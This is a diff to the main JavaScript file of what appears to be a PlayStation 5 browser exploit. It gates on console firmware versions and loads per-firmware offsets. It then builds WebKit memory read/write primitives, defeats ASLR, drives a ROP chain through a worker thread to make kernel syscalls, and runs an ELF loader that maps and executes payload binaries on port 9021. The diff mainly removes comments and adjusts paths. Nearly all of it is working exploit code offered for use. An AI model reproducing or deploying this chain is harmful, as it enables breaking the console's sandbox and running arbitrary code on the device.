@@ -1,63 +1,13 @@
-// @ts-check
-
-
-/**
- * @typedef {Object} UserlandRW
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- */
-
-/**
- * @typedef {Object} WebkitPrimitives
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- * 
- * @property {function(any): void} pre_chain
- * @property {function(any): Promise<void>} launch_chain
- * @property {function(any): int64} malloc_dump
- * @property {function(any, number=): int64} malloc
- * @property {function(int64, number): Uint8Array} array_from_address
- * @property {function(any): int64} stringify
- * @property {function(any, number=): string} readstr
- * @property {function(int64, string): void} writestr
- * 
- * @property {int64} libSceNKWebKitBase
- * @property {int64} libSceLibcInternalBase
- * @property {int64} libKernelBase
- * 
- * @property {any[]} nogc
- * @property {any} syscalls
- * @property {any} gadgets 
- */
-
 if (!navigator.userAgent.includes('PlayStation 5')) {
     alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
     throw new Error("");
 }
 
-const supportedFirmwares = ["1.00", "1.01", "1.02", "1.05", "1.10", "1.11", "1.12", "1.13", "1.14", "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
+const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
 const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
-// @ts-ignore
 window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
-// @ts-ignore
 window.fw_float = parseFloat(fw_str);
 
-// @ts-ignore
-//load offsets & webkit exploit after.
 if (!supportedFirmwares.includes(fw_str)) {
     // @ts-ignore
     alert(`This firmware(${fw_str}) is not supported.`);
@@ -67,14 +17,6 @@ if (!supportedFirmwares.includes(fw_str)) {
 let nogc = [];
 
 let worker = new Worker("rop_slave.js");
-
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} buf 
- * @param {number} family 
- * @param {number} port 
- * @param {number} addr 
- */
 function build_addr(p, buf, family, port, addr) {
     p.write1(buf.add32(0x00), 0x10);
     p.write1(buf.add32(0x01), family);
@@ -82,20 +24,10 @@ function build_addr(p, buf, family, port, addr) {
     p.write4(buf.add32(0x04), addr);
 }
 
-/** 
- * @param {number} port
- * @returns {number}
- */
 function htons(port) {
     return ((port & 0xFF) << 8) | (port >>> 8);
 }
 
-
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} libKernelBase 
- * @returns 
- */
 function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
@@ -111,10 +43,6 @@ function find_worker(p, libKernelBase) {
     throw new Error("failed to find worker.");
 }
 
-
-/**
- * @enum {number}
- */
 var LogLevel = {
     DEBUG: 0,
     INFO: 1,
@@ -128,11 +56,6 @@ var LogLevel = {
 
 let consoleElem = null;
 let lastLogIsTemp = false;
-/**
- * 
- * @param {string} string 
- * @param {LogLevel} level 
- */
 function log(string, level) {
     if (consoleElem === null) {
         consoleElem = document.getElementById("console");
@@ -144,8 +67,8 @@ function log(string, level) {
 
     if (isTemp && lastLogIsTemp) {
         const lastChild = consoleElem.lastChild;
-        lastChild.innerText = string;
-        lastChild.className = elemClass;
+        if (lastChild) lastChild.innerText = string;
+        if (lastChild) lastChild.className = elemClass;
         return;
     } else if (isTemp) {
         lastLogIsTemp = true;
@@ -169,12 +92,6 @@ const SOCK_DGRAM = 2;
 const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
-
-
-/**
- * @param {UserlandRW} p 
- * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
- */
 async function prepare(p) {
     //ASLR defeat patsy (former vtable buddy)
     let textArea = document.createElement("textarea");
@@ -215,12 +132,6 @@ async function prepare(p) {
         ptr.backing = backing;
         return ptr;
     }
-
-    /**
-     * @param {number} sz 
-     * @param {number} type 
-     * @returns 
-     */
     function malloc(sz, type = 4) {
         let backing;
         if (type == 1) {
@@ -310,7 +221,7 @@ async function prepare(p) {
 
     }
 
-    let worker = new Worker("rop_slave.js");
+    // Worker already initialized at line 19
     
     await wait_for_worker();
 
@@ -392,10 +303,6 @@ async function prepare(p) {
     return { p: p2, chain: chain };
 }
 
-/**
- * @param {UserlandRW} userlandRW
- * @param {boolean} wkOnly
- */
 async function main(userlandRW, wkOnly = false) {
     const debug = false;
 
@@ -456,29 +363,6 @@ async function main(userlandRW, wkOnly = false) {
         ip = { ip: "", name: "Offline" };
     }
 
-    // async function probe_sb_elfldr() {
-    //     let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
-    //     if (fd <= 0) {
-    //         return false;
-    //     }
-
-    //     let addr = p.malloc(0x10);
-    //     // let localhost = aton("127.0.0.1");
-    //     // alert("localhost: " + localhost.toString(16));
-    //     build_addr(addr, AF_INET, htons(9021), 0x0100007F);
-    //     let connect_res = (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low << 0;
-    //     if (connect_res < 0) {
-    //         await chain.syscall(SYS_CLOSE, fd);
-    //         return false;
-    //     }
-
-    //     // send something otherwise elfldr will get stuck
-    //     let write_res = (await chain.syscall(SYS_WRITE, fd, addr, 0x1)).low << 0;
-
-    //     await chain.syscall(SYS_CLOSE, fd);
-    //     return true;
-    // }
-
     async function probe_sb_elfldr() {
         // if the bind fails, elfldr is running so return true
         let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
@@ -517,7 +401,7 @@ async function main(userlandRW, wkOnly = false) {
 
     var load_payload_into_elf_store_from_local_file = async function (filename) {
         await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
-        const response = await fetch('payloads/' + filename);
+        const response = await fetch(filename);
         if (!response.ok) {
             throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
         }
@@ -676,7 +560,6 @@ async function main(userlandRW, wkOnly = false) {
             let rela_table_count = 0;
             let rela_table_size = 0;
             let rela_table_entsize = 0;
-            /** @type {int64} */
             let shadow_write_mapping = 0;
 
             // Parse program headers and map segments
@@ -837,9 +720,6 @@ async function main(userlandRW, wkOnly = false) {
 
         }
 
-        /**
-         * @returns Promise<number> - The return value of the payload
-         */
         var wait_for_elf_to_exit = async function () {
             // Join pthread and wait until we're finished executing
             await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
@@ -872,8 +752,6 @@ async function main(userlandRW, wkOnly = false) {
             await log("elfldr exited with non-zero code, port 9021 will likely not work", LogLevel.ERROR);
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
-
-        // const SOCK_NONBLOCK = 0x20000000; // for future reference, this is ignored if we're not jailbroken and explicitly setting it with fcntl returns SCE_KERNEL_ERROR_EACCES (at least on 4.03)
 
         var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
         if (elf_loader_socket_fd <= 0) {
@@ -922,28 +800,6 @@ async function main(userlandRW, wkOnly = false) {
         if (stat_buf.backing.byteLength < 0x78) {
             throw new Error("Stat buffer size too small");
         }
-
-        // struct stat {
-        //     0 __dev_t   st_dev;		/* inode's device */
-        //     4 ino_t	  st_ino;		/* inode's number */
-        //     8 mode_t	  st_mode;		/* inode protection mode */
-        //     10 nlink_t	  st_nlink;		/* number of hard links */
-        //     12 uid_t	  st_uid;		/* user ID of the file's owner */
-        //     16 gid_t	  st_gid;		/* group ID of the file's group */
-        //     20 __dev_t   st_rdev;		/* device type */
-        //     24 struct	timespec st_atim;	/* time of last access */
-        //     40 struct	timespec st_mtim;	/* time of last data modification */
-        //     56 struct	timespec st_ctim;	/* time of last file status change */
-        //     72 off_t	  st_size;		/* file size, in bytes */
-        //     80 blkcnt_t st_blocks;		/* blocks allocated for file */
-        //     88 blksize_t st_blksize;		/* optimal blocksize for I/O */
-        //     92 fflags_t  st_flags;		/* user defined flags for file */
-        //     96 __uint32_t st_gen;		/* file generation number */
-        //     100 __int32_t st_lspare;
-        //     104 struct timespec st_birthtim;	/* time of file creation */
-        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
-        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
-        // };
 
         let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;
 
@@ -1052,18 +908,6 @@ async function main(userlandRW, wkOnly = false) {
                 let loops = 0;
                 while (offset < bytes_read) {
                     loops++;
-                    // struct dirent {
-                    //     __uint32_t d_fileno;		/* file number of entry */
-                    //     __uint16_t d_reclen;		/* length of this record */
-                    //     __uint8_t  d_type; 		/* file type, see below */
-                    //     __uint8_t  d_namlen;		/* length of string in d_name */
-                    // #if __BSD_VISIBLE
-                    // #define	MAXNAMLEN	255
-                    //     char	d_name[MAXNAMLEN + 1];	/* name must be no longer than this */
-                    // #else
-                    //     char	d_name[255 + 1];	/* name must be no longer than this */
-                    // #endif
-                    // };
 
                     let d_fileno = bufferDataView.getUint32(offset, true);
                     let d_reclen = bufferDataView.getUint16(offset + 4, true);
@@ -1093,9 +937,6 @@ async function main(userlandRW, wkOnly = false) {
         }
     }
 
-    /**
-     * @param {function(string): void} [log]
-     */
     async function delete_appcache(log = () => { }) {
         let user_home_entries = await ls("/user/home", elf_store);
         // if we're sandboxed we'll only have one
@@ -1169,20 +1010,16 @@ async function main(userlandRW, wkOnly = false) {
         ports += "9021";
     }
 
-    // @ts-ignore
     document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;
 
-    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
     let queue = [];
 
     window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
-        /** @type {PayloadInfo} */
         let payload_info = event.detail;
         let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
         queue.push({ payload_info, toast });
     });
 
-    // await log("Done, switching to payloads screen...", LogLevel.INFO);
     await new Promise(resolve => setTimeout(resolve, 300));
     await switchPage("payloads-view");
 
@@ -1191,7 +1028,7 @@ async function main(userlandRW, wkOnly = false) {
 
         if (queue.length > 0) {
 
-            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());
+            let { payload_info, toast } = (queue.shift());
 
             try {
                 if (payload_info.customAction) {
@@ -1206,7 +1043,7 @@ async function main(userlandRW, wkOnly = false) {
 
                     if (!payload_info.toPort) {
                         if (wkOnly) {
-                            throw new Error(); // unreachable, in wkOnly theres only buttons for payloads with toPort
+                            throw new Error();
                         }
 
                         updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
@@ -1300,5 +1137,4 @@ async function main(userlandRW, wkOnly = false) {
 
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
-// @ts-ignore
-fwScript.setAttribute('src', `offsets/${window.fw_str}.js`);
+fwScript.setAttribute('src', `${window.fw_str}.js`);
